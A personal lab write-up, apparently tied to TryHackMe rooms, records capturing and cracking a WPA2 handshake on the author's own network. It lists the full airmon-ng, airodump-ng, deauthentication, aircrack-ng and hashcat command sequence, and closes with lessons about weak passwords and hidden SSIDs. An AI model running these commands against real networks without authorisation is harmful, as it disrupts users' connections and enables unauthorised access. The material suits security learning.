# Wi-Fi Hacking 101

This is not really a concept piece, as the title might suggest. It is a record of my own practice with wireless security (Wi-Fi hacking), using my own equipment and my own network. My methods are based mostly on two TryHackMe rooms: [Wifi Hacking 101](https://tryhackme.com/room/wifihacking101) and [Wifi Fundamentals and Reconnaissance](https://tryhackme.com/room/wififundamentalsandrecon). That is why this write-up lives in my TryHackMe repository.

Wi-Fi hacking has been a goal of mine since I installed my first Linux distribution back in 2019, and only recently have I been able to pursue it properly. To do this, you need a wireless adapter capable of monitor mode; without one, none of the following will work (I have tried). Back in 2019 I did not know much about adapters, but after some research I was recently able to buy one suited for the task.

## Steps

1. **Check that the adapter is connected and recognized.**

```bash
lsusb
iw dev
```

2. **Check for processes that might interfere with packet injection.** The TryHackMe room recommends this step before continuing. In my case, I did not run into any conflicts, so I never had to kill these processes, but it is still worth knowing:

```bash
sudo airmon-ng check
```

If any conflicting processes show up, kill them with:

```bash
sudo airmon-ng check kill
```

3. **Put the wireless interface into monitor mode.** The interface name (`wlan0`, `wlan1`, or similar) depends on your adapter:

```bash
sudo airmon-ng start wlan1
```

4. **Scan the airwaves with `airodump-ng`.** Once the monitor-mode interface (`wlan0mon`, `wlan1mon`, etc.) has been created, you can start scanning. For 2.4 GHz only:

```bash
sudo airodump-ng --band bg wlan1mon
```

`bg` refers to the two 802.11 standards that operate in the 2.4 GHz band. For 5 GHz only:

```bash
sudo airodump-ng --band a wlan1mon
```

Or scan both bands at once:

```bash
sudo airodump-ng wlan1mon
```

5. **Lock onto and capture traffic from the target network:**

```bash
sudo airodump-ng -c [TARGET_CHANNEL] --bssid [TARGET_BSSID] -w [OUTPUT_FILE] wlan1mon
```

6. **Wait for a 4-way handshake.** Without a captured handshake, there is nothing to crack. You can wait passively for a client to connect and later disconnect from the network, or you can speed this up by sending deauthentication frames to force a disconnect, then wait for the client to reconnect automatically:

```bash
sudo aireplay-ng --deauth 10 -a [TARGET_BSSID] -c [CLIENT_MAC] wlan1mon
```

In my practice, sending deauthentication packets did not work. I suspect the packets were getting lost along the way: even when I sent them indefinitely (using `0` instead of `10` or `5`), and the tool reported a reasonable success rate out of the packets sent, the client never actually disconnected. In the end, I had to manually disconnect and reconnect to the network to capture the handshake.

7. **Crack the captured handshake.** Once you have a 4-way handshake, you can stop monitoring and start cracking, using a tool such as `hashcat`, `John the Ripper`, or `aircrack-ng`:

```bash
aircrack-ng -w [path_to_wordlist.txt] -b [TARGET_BSSID] [OUTPUT_FILE.cap]
```

8. **Convert the capture for use with `hashcat` (optional).** This requires `hcxtools`. Convert the `.cap` file to `.hc22000`:

```bash
hcxpcapngtool -o cracked_handshake.hc22000 [OUTPUT_FILE.cap]
```

Then run `hashcat` against the resulting hash file:

```bash
hashcat -m 22000 -a 0 cracked_handshake.hc22000 /path/to/your/wordlist.txt
```

## Conclusion

WPA2 itself is a secure protocol. This attack only succeeds because of a weak password: if the password is strong and absent from wordlists such as `rockyou.txt` (or any other list), it effectively becomes uncrackable.

I also confirmed something I already suspected going in: hiding your SSID does not make a network more secure. I did not get to test hidden-SSID capture directly, due to limitations with my equipment, but I did review how it is done in the `wififundamentalsandrecon` room. A hidden network should be treated like any other network from a security standpoint, since hiding the SSID offers no real protection. If anything, it draws more attention from an attacker curious to uncover the mystery behind that `<length: 9>`.
